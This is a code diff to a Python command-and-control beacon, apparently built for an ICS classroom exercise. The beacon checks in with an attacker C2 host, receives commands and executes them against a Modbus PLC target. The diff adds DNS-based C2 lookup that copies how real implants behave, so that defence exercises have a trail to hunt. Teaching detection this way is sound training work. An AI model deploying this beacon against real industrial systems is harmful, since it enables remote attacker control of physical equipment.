@@ -21,6 +21,7 @@ import argparse
 import json
 import socket
 import struct
+import threading
 import time
 
 
@@ -82,6 +83,27 @@ def execute(cmd, target_host, target_port, target_unit):
     return results
 
 
+def resolve(name, timeout=3.0):
+    """IPv4 address for `name`, or None - bounded by `timeout`.
+
+    getaddrinfo can't be cancelled, so it runs in a daemon thread: with no
+    upstream DNS (e.g. an offline classroom) the router's forwarder can take
+    a while to give up, and the beacon shouldn't stall behind it.
+    """
+    result = []
+
+    def lookup():
+        try:
+            result.append(socket.getaddrinfo(name, None, socket.AF_INET)[0][4][0])
+        except Exception:
+            pass
+
+    t = threading.Thread(target=lookup, daemon=True)
+    t.start()
+    t.join(timeout)
+    return result[0] if result else None
+
+
 def check_in(c2_host, c2_port, beacon_id):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(5)
@@ -100,6 +122,12 @@ def check_in(c2_host, c2_port, beacon_id):
 def main():
     parser = argparse.ArgumentParser(description=__doc__)
     parser.add_argument("--c2-host", required=True, help="Kali's IP")
+    parser.add_argument("--c2-name", help="hostname to look up before checking in, the way "
+                        "real implants find their C2; falls back to --c2-host if it doesn't "
+                        "resolve. Leaves the DNS trail the defense exercises hunt for")
+    parser.add_argument("--dns-interval", type=float, default=60.0,
+                        help="seconds between lookups of --c2-name (real implants reuse an "
+                        "answer for a while rather than querying on every check-in)")
     parser.add_argument("--c2-port", type=int, default=4444)
     parser.add_argument("--target-host", required=True, help="the real Modbus target, e.g. the PLC's IP")
     parser.add_argument("--target-port", type=int, default=502)
@@ -108,8 +136,13 @@ def main():
     parser.add_argument("--beacon-id", default="hmi-01")
     args = parser.parse_args()
 
+    c2_addr = args.c2_host
+    next_lookup = 0.0
     while True:
-        response = check_in(args.c2_host, args.c2_port, args.beacon_id)
+        if args.c2_name and time.monotonic() >= next_lookup:
+            c2_addr = resolve(args.c2_name) or args.c2_host
+            next_lookup = time.monotonic() + args.dns_interval
+        response = check_in(c2_addr, args.c2_port, args.beacon_id)
         cmd = response.get("cmd") if response else None
         if cmd:
             print(f"[beacon] received command: {cmd}", flush=True)
